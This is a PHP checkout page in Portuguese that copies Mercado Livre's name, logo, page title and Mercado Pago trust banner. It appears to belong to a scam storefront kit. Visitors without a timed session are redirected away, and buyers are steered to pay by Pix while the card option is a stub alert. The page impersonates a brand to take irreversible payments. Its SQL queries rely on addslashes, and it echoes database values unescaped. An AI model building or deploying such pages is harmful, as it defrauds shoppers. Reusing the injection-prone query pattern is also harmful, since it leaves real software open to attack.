<?php 
session_start();
require_once("api/db.php");

if (!isset($_GET["produto"])) {
    session_destroy();
    header("Location: https://www.lojavirtual.com.br/");
    exit();
} else {
    $id = addslashes($_GET["produto"]);
    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
    if(mysqli_num_rows($sqlx) > 0){
        if($_SESSION['session_address'] > time()){
            $sql = mysqli_query($conn, "SELECT * from config");
            while($row = mysqli_fetch_array($sql)){ 
                $cor = $row["cor"];
                $nome = $row["nome"];
            }
            $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
            while($row1 = mysqli_fetch_array($sql1)){ 
                $codigo = $row1["codigo"];
                $nomeproduto = $row1["nome"];
                $valor = $row1["valor"];
                $img = $row1["img"];
            }
            $_SESSION['session_payment'] = time() + 1000;
        } else {
            session_destroy();
            header("Location: https://www.lojavirtual.com.br/");
            exit();
        }
    } else {
        session_destroy();
        header("Location: https://www.lojavirtual.com.br/");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Como você prefere pagar? - Mercado Livre</title>
    <link rel="shortcut icon" href="./arquivos/favicon.png?v=2">
    <link rel="icon" type="image/png" href="./arquivos/favicon.png?v=2">
    <link rel="stylesheet" href="./arquivos/fa.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap');
        body { font-family: "Montserrat", "Proxima Nova", "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; color: #333; }
        header { background-color: #ffe600; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; }
        .logo { height: 34px; }
        .contact-link { color: #333; text-decoration: none; font-size: 13px; font-weight: 600; }
        .container { max-width: 1000px; margin: 30px auto; display: flex; gap: 30px; padding: 0 15px; flex-wrap: wrap; }
        .payment-content { flex: 2; min-width: 300px; }
        .summary-content { flex: 1; min-width: 300px; }
        .section-title { font-size: 24px; font-weight: 600; margin-bottom: 25px; }
        .payment-card { background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .payment-option { display: flex; align-items: center; padding: 25px; border-bottom: 1px solid #eee; cursor: pointer; transition: background 0.2s; }
        .payment-option:hover { background: #fafafa; }
        .payment-option:last-child { border-bottom: none; }
        .option-radio { margin-right: 20px; width: 20px; height: 20px; }
        .option-icon { width: 40px; height: 40px; margin-right: 20px; display: flex; align-items: center; justify-content: center; background: #f5f5f5; border-radius: 50%; color: #3483fa; font-size: 20px; }
        .option-details { flex: 1; }
        .option-name { font-size: 16px; font-weight: 600; margin-bottom: 2px; }
        .option-desc { font-size: 13px; color: #00a650; }
        .summary-card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); position: sticky; top: 20px; }
        .summary-product { display: flex; gap: 12px; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #eee; margin-bottom: 15px; }
        .summary-img { width: 64px; height: 64px; object-fit: contain; }
        .summary-info { flex: 1; }
        .summary-name { font-size: 13px; color: #333; line-height: 1.2; margin-bottom: 4px; }
        .summary-qty { font-size: 12px; color: #999; }
        .summary-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #666; }
        .summary-total-row { display: flex; justify-content: space-between; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee; font-size: 18px; font-weight: 600; }
        .btn-pay { display: block; width: 100%; background: #3483fa; color: #fff; text-align: center; padding: 15px; border-radius: 6px; font-weight: 600; border: none; cursor: pointer; font-size: 16px; margin-top: 25px; }
        .btn-pay:hover { background: #2968c8; }
        .mercado-pago-banner { font-size: 12px; color: #999; margin-bottom: 15px; display: flex; align-items: center; gap: 5px; }
        .mercado-pago-banner i { color: #3483fa; }
        @media (max-width: 768px) {
            .container { flex-direction: column; }
            .summary-content { order: -1; }
        }
    </style>
</head>
<body>
    <header>
        <img src="./arquivos/logo-mercadolivre.png" alt="Mercado Livre" class="logo">
        <a href="#" class="contact-link">Contato</a>
    </header>

    <div class="container">
        <div class="payment-content">
            <div class="section-title">Como você prefere pagar?</div>
            <div class="mercado-pago-banner">Com Mercado Pago <i class="fas fa-shield-alt"></i></div>
            
            <div class="payment-card">
                <div class="payment-option" onclick="selectOption('pix')">
                    <input type="radio" name="payment" id="radio-pix" class="option-radio" checked>
                    <div class="option-icon"><img src="./arquivos/icone-pix.png" alt="Pix" style="width: 24px; height: 24px; object-fit: contain;"></div>
                    <div class="option-details">
                        <div class="option-name">Pix</div>
                        <div class="option-desc">Aprovação imediata</div>
                    </div>
                </div>
                
                <div class="payment-option" onclick="selectOption('card')">
                    <input type="radio" name="payment" id="radio-card" class="option-radio">
                    <div class="option-icon"><img src="./arquivos/icone-cartao.png" alt="Cartão" style="width: 24px; height: 24px; object-fit: contain;"></div>
                    <div class="option-details">
                        <div class="option-name">Novo cartão de crédito</div>
                        <div class="option-desc" style="color: #666;">Até 12 parcelas sem juros</div>
                    </div>
                </div>
            </div>
        </div>

        <div class="summary-content">
            <div class="summary-card">
                <div class="summary-product">
                    <?php 
                    // Verifica se a imagem é uma URL (começa com http) ou um arquivo local
                    $img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img";
                    ?>
                    <img src="<?php echo $img_src; ?>" alt="Produto" class="summary-img">
                    <div class="summary-info">
                        <div class="summary-name"><?php echo $nomeproduto; ?></div>
                        <div class="summary-qty">Quantidade: <span id="summaryQty">1</span></div>
                    </div>
                </div>
                <div class="summary-row">
                    <span>Produto</span>
                    <span id="subtotalPrice">R$ 0,00</span>
                </div>
                <div class="summary-row">
                    <span>Frete</span>
                    <span style="color: #00a650;">Grátis</span>
                </div>
                <div class="summary-total-row">
                    <span>Você pagará</span>
                    <span id="totalPrice">R$ 0,00</span>
                </div>

                <button class="btn-pay" onclick="finish()">Continuar</button>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        let selectedMethod = 'pix';

        $(document).ready(function(){
            const data = JSON.parse(localStorage.getItem('lojavirtual') || '{}');
            if(data.precoFinal) {
                $('#subtotalPrice').text('R$ ' + data.precoFinal);
                $('#totalPrice').text('R$ ' + data.precoFinal);
                $('#summaryQty').text(data.quantos);
            }
        });

        function selectOption(method) {
            selectedMethod = method;
            $(`#radio-${method}`).prop('checked', true);
        }

        function finish() {
            if(selectedMethod === 'pix') {
                window.location.href = 'success.php?produto=<?php echo $codigo; ?>';
            } else {
                // Aqui você pode redirecionar para uma tela de cartão se tiver
                alert('Funcionalidade de cartão em desenvolvimento. Por favor, use Pix.');
            }
        }
    </script>
</body>
</html>
